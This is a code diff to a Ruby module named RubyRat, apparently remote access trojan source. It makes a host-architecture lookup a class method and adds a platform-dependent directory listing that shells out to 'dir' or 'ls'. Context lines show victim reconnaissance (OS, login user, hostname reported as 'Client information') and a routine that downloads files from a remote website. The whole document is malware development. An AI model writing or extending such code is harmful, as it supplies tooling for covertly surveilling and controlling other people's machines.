@@ -14,7 +14,7 @@ module RubyRat
       true  # TODO
     end
 
-    def getarch
+    def self.getarch
       case RUBY_PLATFORM
         when /mswin|windows/i
           `wmic OS get OSArchitecture`.split("\n")[1]
@@ -29,11 +29,26 @@ module RubyRat
       end
     end
 
+    def self.ls
+      case RUBY_PLATFORM
+        when /mswin|windows/i
+          `dir`
+        when /linux|arch/i
+          `ls`
+        when /sunos|solaris/i
+          `ls`
+        when /darwin/i
+          `ls`
+        else
+          return ''
+      end
+    end
+
     def self.sysinfo
       results = {}
       results[:os]   = RUBY_PLATFORM
       results[:user] = Etc.getlogin
-      results[:arch] = getarch
+      results[:arch] = self.getarch
       results[:name] = Socket.gethostname
       table = Terminal::Table.new do |t|
         t << ['Client information', '']
@@ -73,7 +88,7 @@ module RubyRat
       filepath = parsed[1..-1].join '/'
       filepath[0, 0] = '/'  # Prepend a slash
       filename = parsed[-1]
-      
+
       begin
         Net::HTTP.start(website) do |http|
           resp = http.get(filepath)
